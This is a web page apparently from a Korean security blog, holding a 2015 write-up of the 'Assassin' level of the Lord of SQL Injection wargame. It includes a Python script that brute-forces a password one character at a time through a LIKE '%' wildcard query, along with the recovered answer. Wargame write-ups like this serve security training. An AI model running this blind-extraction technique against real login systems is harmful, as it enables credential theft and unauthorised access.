@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Tempuss Blog" /></head>
+<style>@import url(/public/css/syntax/monokai.css);</style>
+  <title>Tempuss Blog</title>
+  <!-- <link href="/public/css/bootstrap.min.css" rel="stylesheet"> -->
+
+  <link href="/public/css/style.css" rel="stylesheet">
+  <body>
+  	<div class="container"> 
+		<div class="sidebar">
+			<div class="sidebar-item sidebar-header">
+	<div class='sidebar-brand'>
+		<a href="/about/">Tempuss Blog</a>
+	</div>
+	<p class="lead">보안하는 개발자</p></div>
+
+<div class="sidebar-item sidebar-nav">
+	<ul class="nav">
+      <li class="nav-title">Pages</li>
+	  <li>
+	  	<a class="nav-item" href="/">Articles</a>
+	  </li>
+	  
+	  
+	    
+	  
+	    
+	      
+	        <li>
+	        	<a class="nav-item" href="/about/">
+	            	About
+	            </a>
+	        </li>
+	      
+	    
+	  
+	    
+	      
+	    
+	  
+	    
+	  
+	    
+	  
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-nav">
+  	<ul class="nav">
+			<li class="nav-title">Categories</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Hacking">
+				<span class="name">Hacking</span>
+				<span class="badge">39</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Web">
+				<span class="name">Web</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#BoB">
+				<span class="name">BoB</span>
+				<span class="badge">9</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Data-Engineering">
+				<span class="name">Data-Engineering</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	  </nav>
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-footer">
+	<p>Powered by <a href="https://github.com/jekyll/jekyll">Jekyll</a></p>
+</div>
+		</div>
+		<div class="content">
+			<article class="post">
+	<header class="post-header">
+		<div class="post-title"> 
+			LOS Assassin
+		</div>
+		<time class="post-date dt-published" datetime="2015-10-23T00:37:00+09:00" itemprop="datePublished">2015/10/23
+		</time>		
+	</header>
+
+	<div class="post-content">
+		<p>보아하니 %연산자를 이용한 공격이다.</p>
+
+<p>pw like ‘a%’ 를 하게될 경우 a로 시작하는 모든 값을 검색한다. 즉 참이 된다</p>
+
+<p>페이로드를 날려보면</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+ 
+ 
+ 
+<span class="n">key</span><span class="o">=</span><span class="s">""</span>
+<span class="n">site</span><span class="o">=</span><span class="s">""</span>
+<span class="n">header</span><span class="o">=</span><span class="p">{</span><span class="s">'Cookie'</span><span class="p">:</span><span class="s">'PHPSESSID=vj0mghpj5cs5n24hh6pr7r4ne6'</span><span class="p">}</span>
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">12</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span><span class="mi">91</span><span class="p">)):</span>
+                <span class="n">site</span><span class="o">=</span><span class="s">"http://los.sandbox.cash/chall/assassin_dbfabd99373ea659e58407bc1a8438c6.php?pw="</span>
+                <span class="n">site</span><span class="o">+=</span><span class="n">key</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="si">%</span><span class="s">"</span>
+                <span class="k">print</span> <span class="p">(</span><span class="n">site</span><span class="p">)</span>
+                <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">site</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
+                
+                <span class="k">if</span> <span class="s">"&lt;br&gt;&lt;h2&gt;Hello guest"</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                        <span class="k">break</span>
+        <span class="n">key</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">key"</span><span class="o">+</span><span class="n">key</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+                
+<span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">F</span><span class="se">\n</span><span class="s">Key is :"</span><span class="o">+</span><span class="n">key</span><span class="o">+</span><span class="s">" </span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">)</span>
+
+
+</code></pre></div></div>
+
+<p>해보면</p>
+
+<p>90d2fe10</p>
+
+<p>이게 답이라고 한다.</p>
+
+<p>근데 아무리 해도 안나오는걸 보면 admin pw랑 겹치는 부분이 있는것 같다.</p>
+
+<p>그래서 9% 90% 이런식으로 다시 한번 해보았다.</p>
+
+<p>정답이었다.</p>
+
+<p>902EFD10</p>
+
+
+	</div>
+</article>
+		</div>
+	</div>
+  </body>
+</html>
